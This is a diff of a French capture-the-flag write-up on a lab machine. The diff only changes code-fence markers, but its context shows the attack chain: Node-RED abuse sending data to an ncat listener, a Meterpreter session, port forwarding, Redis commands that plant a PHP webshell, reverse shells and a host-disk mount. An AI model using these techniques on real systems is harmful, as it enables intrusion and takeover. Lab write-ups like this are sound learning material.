@@ -13,7 +13,7 @@ Balance ton flow
 
 Un scan Nmap ne nous amène pas grand chose : tout juste un serveur web utilisant Node.  
 
-```plain
+```
 1880/tcp open  http    Node.js Express framework
 ```
 
@@ -21,7 +21,7 @@ Quand on se rend sur le site on obtient juste le message *Cannot GET /*.
 
 Ok ok... qu'est-ce que tu nous propose alors ?  
 
-```plain
+```
 $ curl -D- -X OPTIONS http://10.10.10.94:1880/
 HTTP/1.1 200 OK
 X-Powered-By: Express
@@ -35,7 +35,7 @@ Connection: keep-alive
 
 Il suffisait de demander :) Va pour un petit POST  
 
-```plain
+```
 $ curl -D- -X POST http://10.10.10.94:1880/
 HTTP/1.1 200 OK
 X-Powered-By: Express
@@ -62,7 +62,7 @@ Ici l'action consiste à lire un fichier. Pour cela on prend l'icône marron *fi
 
 On le relie alors à une sortie de type *tcp* où l'on rentre l'hôte et le port, on clique sur le bouton rouge *Deploy* et on reçoit ce qu'on attendait :  
 
-```plain
+```
 $ ncat -l -p 7777 -v
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::7777
@@ -134,7 +134,7 @@ Ensuite j'appelle *exec* sur */bin/sh* avec les arguments *-c "chmod +x /tmp/dev
 
 On obtient alors notre session *Meterpreter* et on n'est qu'au début d'un looooog voyage :)  
 
-```plain
+```
 meterpreter > ifconfig
 
 Interface  1
@@ -176,7 +176,7 @@ Pour trouver les autres containers on va scanner les réseaux accessibles. Uploa
 
 Une fois uploadé Nmap se plaignait de l'absence du fichier *nmap-services* : même punition, upload dans le même dossier et ça fonctionne :)  
 
-```plain
+```
 ./nmap -sT -T5 -p1-65535 -oA devloop --open 172.19.0.0/16
 
 Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-01-14 20:08 UTC
@@ -199,7 +199,7 @@ MAC Address: 02:42:AC:13:00:03 (Unknown)
 
 On s'empresse de port-forwarder ces deux ports depuis notre session Meterpreter (cela permet d'avoir les ports directements accessibles sur 127.0.0.1, Meterpreter fait le reste).  
 
-```plain
+```
 portfwd add -l 6379 -p 6379 -r 172.19.0.2
 portfwd add -l 80 -p 80 -r 172.19.0.3
 ```
@@ -210,7 +210,7 @@ Pour le Redis c'est plus intéressant. Certes si on effectue un *searchsploit re
 
 Metasploit dispose d'un module *auxiliary/scanner/redis/file\_upload* dont la description est assez parlante :  
 
-```plain
+```
 Description:
   This module can be used to leverage functionality exposed by Redis
   to achieve somewhat arbitrary file upload to a file and directory to
@@ -262,7 +262,7 @@ Malheureusement pas de serveur SSH accessible ici, l’intérêt est donc très 
 
 Pour celà on envoie les commandes suivantes au Redis :  
 
-```plain
+```
 config set dir /var/www/html
 set dbfilename devloop.php
 set payload "<?php system($_GET['cmd']); ?>
@@ -284,7 +284,7 @@ Pour le second problème j'ai vu que les dotfiles ne semblent pas supprimées pa
 
 Sur cette machine où l'on dispose de droits restreints (www-data) on peut voir les dossiers personnels de deux utilisateurs du système :  
 
-```plain
+```
 /home:
 total 32
 drwxr-xr-x 5 root root  4096 Jul 15  2018 .
@@ -403,7 +403,7 @@ Ce script copie un netcat sous forme encodée (base64) vers */tmp* et insère la
 
 On attend un peu que le script de backup soit exécuté :  
 
-```plain
+```
 Ncat: Connection from 172.19.0.2.
 Ncat: Connection from 172.19.0.2:43312.
 id
@@ -445,7 +445,7 @@ Pour les gros binaires statiques il aura fallu les compresser au préalable avec
 
 On découvre alors un nouveau réseau en 120.20 :  
 
-```plain
+```
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.20.0.2  netmask 255.255.0.0  broadcast 172.20.255.255
         ether 02:42:ac:14:00:02  txqueuelen 0  (Ethernet)
@@ -473,7 +473,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 
 On envoie à nouveau un Nmap et on recommence. On n'est pas trop surpris de voir un serveur rsync :  
 
-```plain
+```
 Nmap scan report for reddish_composition_backup_1.reddish_composition_internal-network-2 (172.20.0.2)
 Host is up (0.00012s latency).
 Not shown: 65526 closed ports
@@ -492,7 +492,7 @@ MAC Address: 02:42:AC:14:00:02 (Unknown)
 
 Via rsync on peut donc lire les fichiers présents sur le système mais on n'y trouve rien d'intéressant (le flag *root.txt* n'est pas présent).  
 
-```plain
+```
 $ rsync rsync://backup:873/
 src             src path
 
@@ -551,7 +551,7 @@ Cette commande est du coup à placer avant l'exécution rsync ;-)
 
 Cette fois on le tient notre accès root sur le dernier container :  
 
-```plain
+```
 Ncat: Connection from 172.19.0.3.
 Ncat: Connection from 172.19.0.3:57776.
 id
@@ -578,7 +578,7 @@ Il aura fallut switcher en permanence de l'un à l'autre : utiliser rsync depuis
 
 Je m'en suis remis aux conseils de [r0pSteev](https://twitter.com/stevenaathan4) qui invitaient à se pencher sur les partitions du système.  
 
-```plain
+```
 $ lsblk -o NAME,FSTYPE,SIZE,MOUNTPOINT,LABEL
 NAME   FSTYPE  SIZE MOUNTPOINT LABEL
 sda             18G
@@ -592,7 +592,7 @@ sr0           1024M
 
 Et effectivement :  
 
-```plain
+```
 mount -t ext4 /dev/sda1 /mnt
 ls -l /mnt
 total 104
